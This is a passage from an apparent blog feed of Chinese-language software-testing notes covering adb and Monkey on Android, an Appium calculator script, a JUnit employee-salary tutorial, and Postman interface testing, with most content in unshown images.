alt="1615312862427" style="zoom:50%;"></p><ul><li>安装和卸载APK程序</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313005852.png" alt="1615313005852" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313041547.png" alt="1615313041547" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314153934.png" alt="1615314153934" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314260967.png" alt="1615314260967" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314304693.png" alt="1615314304693" style="zoom:50%;"></p><ul><li>列出当前设备上的程序包</li></ul><blockquote><p>adb shell pm list packages</p></blockquote><ul><li>上传和下载</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314565572.png" alt="1615314565572" style="zoom:50%;"></p></blockquote><ul><li>日志</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396174848.png" alt="1615396174848" style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396200109.png" alt="1615396200109" style="zoom: 50%;"></p><blockquote><p>过滤<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396478274.png" alt="1615396478274"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396559638.png" alt="1615396559638" style="zoom:50%;"></p><ul><li>其他</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396733068.png" alt="1615396733068" style="zoom:50%;"></p><blockquote><p>adb bugreport</p></blockquote><h4 id="monkey命令"><a href="#monkey命令" class="headerlink" title="monkey命令"></a>monkey命令</h4><h5 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a><strong>是什么？</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615481732999.png" alt="1615481732999" style="zoom:50%;"></p><ul><li><p>所有的操作事件都是随机发生的。不以让人的意志为变化。 由于事件都是随机的、无序的，所以不做功能方面的测试，只对APP进行性能、稳定性方面的测试。</p></li><li><p>monkey测试的时候，需要长时间、大量的操作事件</p></li></ul><h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615482052583.png" alt="1615482052583" style="zoom:50%;"></p><h5 id="Monkey的停止条件"><a href="#Monkey的停止条件" class="headerlink" title="Monkey的停止条件"></a>Monkey的停止条件</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483112988.png" alt="1615483112988" style="zoom:50%;"></p><h5 id="进入Monkey"><a href="#进入Monkey" class="headerlink" title="进入Monkey"></a>进入Monkey</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483206902.png" alt="1615483206902" style="zoom:50%;"></p><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483820132.png" alt="1615483820132" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483835799.png" alt="1615483835799" style="zoom:50%;"></p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484056012.png" alt="1615484056012" style="zoom:50%;"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484263141.png" alt="1615484263141" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484482624.png" alt="1615484482624" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484538246.png" alt="1615484538246" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486792982.png" alt="1615486792982" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615486953589.png" alt="1615486953589"></p><h5 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487083624.png" alt="1615487083624"></p><blockquote><p>—pct</p></blockquote><p>monkey命令的参数,没有特别强制性的顺序,可以按照monkey命令的帮助列表的参数顺序记忆和使用.</p><h5 id="Monkey异常log分析"><a href="#Monkey异常log分析" class="headerlink" title="Monkey异常log分析"></a>Monkey异常log分析</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615487991940.png" alt="1615487991940"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488289973.png" alt="1615488289973" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615488415636.png" alt="1615488415636" style="zoom:50%;"></p><h1 id="Appium"><a href="#Appium" class="headerlink" title="Appium"></a>Appium</h1><blockquote><p><a href="https://github.com/appium/appium-desktop/releases/tag/v1.20.2" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases/tag/v1.20.2</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615557202275.png" alt="1615557202275" style="zoom: 33%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558307389.png" alt="1615558307389" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558370562.png" alt="1615558370562" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615558953951.png" alt="1615558953951" style="zoom:50%;"></p><h2 id="元素识别"><a href="#元素识别" class="headerlink" title="元素识别"></a>元素识别</h2><blockquote><p>使用ADT环境中的sdk目录下,tools目录中的uiautomatorviewer.bat</p></blockquote><p>启动uiautomatorviewer.bat</p><p>点击device Screenshot</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560081753.png" alt="1615560081753"></p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615560132106.png" alt="1615560132106" style="zoom:50%;"></p><h5 id="模拟键盘手机操作"><a href="#模拟键盘手机操作" class="headerlink" title="模拟键盘手机操作"></a>模拟键盘手机操作</h5><blockquote><p>输入操作: sendkeys()</p><p>点击操作: click()</p></blockquote><h5 id="模拟手势操作"><a href="#模拟手势操作" class="headerlink" title="模拟手势操作"></a>模拟手势操作</h5><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563279179.png" alt="1615563279179" style="zoom:50%;"></p></blockquote><h5 id="移动设备相关操作"><a href="#移动设备相关操作" class="headerlink" title="移动设备相关操作"></a>移动设备相关操作</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615563684414.png" alt="1615563684414" style="zoom: 67%;"></p><h2 id="Appium脚本编写"><a href="#Appium脚本编写" class="headerlink" title="Appium脚本编写"></a>Appium脚本编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAppium</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义DesiredCapabilities对象</span></span><br><span class="line">        DesiredCapabilities dc = <span class="keyword">new</span> DesiredCapabilities();</span><br><span class="line">        <span class="comment">//设定DesiredCapabilities的属性</span></span><br><span class="line">        dc.setCapability(<span class="string">"deviceName"</span>,<span class="string">"127.0.0.1:56001"</span>);<span class="comment">//adb命令查出的设备的编号</span></span><br><span class="line">        dc.setCapability(<span class="string">"automationName"</span>,<span class="string">"Appium"</span>);<span class="comment">//设置自动化测试工具名称</span></span><br><span class="line">        dc.setCapability(<span class="string">"platformName"</span>,<span class="string">"Android"</span>);<span class="comment">//设置平台系统名称</span></span><br><span class="line">        dc.setCapability(<span class="string">"platformVersion"</span>,<span class="string">"4.4.4"</span>);<span class="comment">//设置Android系统版本号</span></span><br><span class="line">        dc.setCapability(<span class="string">"appPackage"</span>,<span class="string">"com.youba.calculate"</span>);<span class="comment">//设置目标app包名</span></span><br><span class="line">        dc.setCapability(<span class="string">"appActivity"</span>,<span class="string">".MainActivity"</span>);<span class="comment">//设置目标app的启动界面</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * url:指的是本地appium服务的IP地址及对应的端口号(appium的默认端口号是4723)</span></span><br><span class="line"><span class="comment">        * 通过该地址可以使appium连接Android设备</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * Capabilities:就是DesiredCapabilities对象</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        <span class="comment">//定义appium驱动对象 打开本地app驱动(appium)</span></span><br><span class="line">        AppiumDriver appd = <span class="keyword">new</span> AppiumDriver(<span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1/wd/hub"</span>),dc);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//写脚本,让计算器计算54+68</span></span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_five"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_four"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_plus"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_six"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_eight"</span>)).click();</span><br><span class="line">        appd.findElement(By.id(<span class="string">"com.youba.calculate:id/btn_equal"</span>)).click();</span><br><span class="line">        </span><br><span class="line">        appd.closeApp();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h1><h5 id="一次单元测试用例设计的过程"><a href="#一次单元测试用例设计的过程" class="headerlink" title="一次单元测试用例设计的过程"></a>一次单元测试用例设计的过程</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652206629.png" alt="1615652206629"></p><h4 id="Junit环境"><a href="#Junit环境" class="headerlink" title="Junit环境"></a>Junit环境</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652373832.png" alt="1615652373832"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615652610537.png" alt="1615652610537"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615653557718.png" alt="1615653557718"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615662647821.png" alt="1615662647821"></p><h2 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h2><p>在这里你将会看到一个应用 POJO 类，Business logic 类和在 test runner 中运行的 test 类的 JUnit 测试的例子。</p><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmployeeDetails.java</strong> 的 POJO 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeDetails</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">double</span> monthlySalary;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the name</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> name the name to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the monthlySalary</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getMonthlySalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> monthlySalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> monthlySalary the monthlySalary to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMonthlySalary</span><span class="params">(<span class="keyword">double</span> monthlySalary)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.monthlySalary = monthlySalary;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the age</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> age the age to set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>EmployeeDetails</strong> 类被用于</p><ul><li>取得或者设置雇员的姓名的值</li><li>取得或者设置雇员的每月薪水的值</li><li>取得或者设置雇员的年龄的值</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>EmpBusinessLogic.java</strong> 的 business logic 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmpBusinessLogic</span> </span>&#123;</span><br><span class="line">   <span class="comment">// Calculate the yearly salary of employee</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">calculateYearlySalary</span><span class="params">(EmployeeDetails employeeDetails)</span></span>&#123;</span><br><span class="line">      <span class="keyword">double</span> yearlySalary=<span class="number">0</span>;</span><br><span class="line">      yearlySalary = employeeDetails.getMonthlySalary() * <span class="number">12</span>;</span><br><span class="line">      <span class="keyword">return</span> yearlySalary;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Calculate the appraisal amount of employee</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">calculateAppraisal</span><span class="params">(EmployeeDetails employeeDetails)</span></span>&#123;</span><br><span class="line">      <span class="keyword">double</span> appraisal=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(employeeDetails.getMonthlySalary() &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">         appraisal = <span class="number">500</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         appraisal = <span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> appraisal;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>EmpBusinessLogic</strong> 类被用来计算</p><ul><li>雇员每年的薪水</li><li>雇员的评估金额</li></ul><p>在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestEmployeeDetails.java</strong> 的准备被测试的测试案例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.assertEquals;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestEmployeeDetails</span> </span>&#123;</span><br><span class="line">   EmpBusinessLogic empBusinessLogic =<span class="keyword">new</span> EmpBusinessLogic();</span><br><span class="line">   EmployeeDetails employee = <span class="keyword">new</span> EmployeeDetails();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//test to check appraisal</span></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCalculateAppriasal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      employee.setName(<span class="string">"Rajeev"</span>);</span><br><span class="line">      employee.setAge(<span class="number">25</span>);</span><br><span class="line">      employee.setMonthlySalary(<span class="number">8000</span>);</span><br><span class="line">      <span class="keyword">double</span> appraisal= empBusinessLogic.calculateAppraisal(employee);</span><br><span class="line">      assertEquals(<span class="number">500</span>, appraisal, <span class="number">0.0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// test to check yearly salary</span></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCalculateYearlySalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      employee.setName(<span class="string">"Rajeev"</span>);</span><br><span class="line">      employee.setAge(<span class="number">25</span>);</span><br><span class="line">      employee.setMonthlySalary(<span class="number">8000</span>);</span><br><span class="line">      <span class="keyword">double</span> salary= empBusinessLogic.calculateYearlySalary(employee);</span><br><span class="line">      assertEquals(<span class="number">96000</span>, salary, <span class="number">0.0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TestEmployeeDetails</strong> 是用来测试 <strong>EmpBusinessLogic</strong> 类的方法的，它</p><ul><li>测试雇员的每年的薪水</li><li>测试雇员的评估金额</li></ul><p>现在让我们在 <strong>C:\ &gt; JUNIT_WORKSPACE</strong> 路径下创建一个名为 <strong>TestRunner.java</strong> 的类来执行测试案例类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.runner.JUnitCore;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.Result;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.notification.Failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRunner</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      Result result = JUnitCore.runClasses(TestEmployeeDetails<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">      <span class="keyword">for</span> (Failure failure : result.getFailures()) &#123;</span><br><span class="line">         System.out.println(failure.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(result.wasSuccessful());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用javac编译 Test case 和 Test Runner 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\JUNIT_WORKSPACE&gt;javac EmployeeDetails.java </span><br><span class="line">EmpBusinessLogic.java TestEmployeeDetails.java TestRunner.java</span><br></pre></td></tr></table></figure><p>现在运行将会运行 Test Case 类中定义和提供的测试案例的 Test Runner</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\JUNIT_WORKSPACE&gt;java TestRunner</span><br></pre></td></tr></table></figure><p>检查运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;移动端测试要点&quot;&gt;&lt;a href=&quot;#移动端测试要点&quot; class=&quot;headerlink&quot; title=&quot;移动端测试要点&quot;&gt;&lt;/a&gt;移动端测试要点&lt;/h2&gt;&lt;h3 id=&quot;安装测试、卸载测试&quot;&gt;&lt;a href=&quot;#安装测试、卸载测试&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>interface test</title>
    <link href="https://kayleh.top/Interface-test/"/>
    <id>https://kayleh.top/Interface-test/</id>
    <published>2021-02-20T09:49:12.000Z</published>
    <updated>2021-04-11T17:11:28.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h1><blockquote><p>测试系统内部各个组件间接口,以及系统与外部系统之间的交互点</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613845781204.png" alt="1613845781204" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613928423300.png" alt="1613928423300"></p><h4 id="接口的必要条件"><a href="#接口的必要条件" class="headerlink" title="接口的必要条件"></a>接口的必要条件</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613928573807.png" alt="1613928573807" style="zoom:50%;"></p><h4 id="接口用例设计"><a href="#接口用例设计" class="headerlink" title="接口用例设计"></a>接口用例设计</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613929905199.png" alt="1613929905199" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1613930059453.png" alt="1613930059453"></p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614016580698.png" alt="1614016580698" style="zoom: 33%;"></p><h5 id="HTTP响应状态码分类"><a href="#HTTP响应状态码分类" class="headerlink" title="HTTP响应状态码分类"></a>HTTP响应状态码分类</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614100489562.png" alt="1614100489562" style="zoom:50%;"></p><h1 id="POSTMAN"><a href="#POSTMAN" class="headerlink" title="POSTMAN"></a>POSTMAN</h1><h4 id="发送不带参数的GET请求"><a href="#发送不带参数的GET请求" class="headerlink" title="发送不带参数的GET请求"></a>发送不带参数的GET请求</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614103022980.png" alt="1614103022980"></p><h4 id="发送带参数的GET请求"><a href="#发送带参数的GET请求" class="headerlink" title="发送带参数的GET请求"></a>发送带参数的GET请求</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614102472739.png" alt="1614102472739"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614103130379.png" alt="1614103130379"></p><h4 id="参数化运行"><a href="#参数化运行" class="headerlink" title="参数化运行"></a>参数化运行</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614450840486.png" alt="1614450840486"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276217035.png" alt="1614276217035" style="zoom: 67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276280706.png" alt="1614276280706" style="zoom:67%;"></p><p>csv文件</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614276076934.png" alt="1614276076934" style="zoom: 50%;"></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><h1 id="Postman中的断言"><a href="#Postman中的断言" class="headerlink" title="Postman中的断言"></a>Postman中的断言</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614450747385.png" alt="1614450747385"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614451204413.png" alt="1614451204413"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614451174084.png" alt="1614451174084"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614710982803.png" alt="1614710982803"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614711029433.png" alt="1614711029433"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/Interface-test/1614711672676.png" alt="1614711672676"></p><p>450</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;接口测试&quot;&gt;&lt;a href=&quot;#接口测试&quot; class=&quot;headerlink&quot; title=&quot;接口测试&quot;&gt;&lt;/a&gt;接口测试&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;测试系统内部各个组件间接口,以及系统与外部系统之间的交互点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Unitest framework</title>
    <link href="https://kayleh.top/Unitest-framework/"/>
    <id>https://kayleh.top/Unitest-framework/</id>
    <published>2021-02-12T08:00:57.000Z</published>
    <updated>2021-04-11T17:11:28.470Z</updated>
    
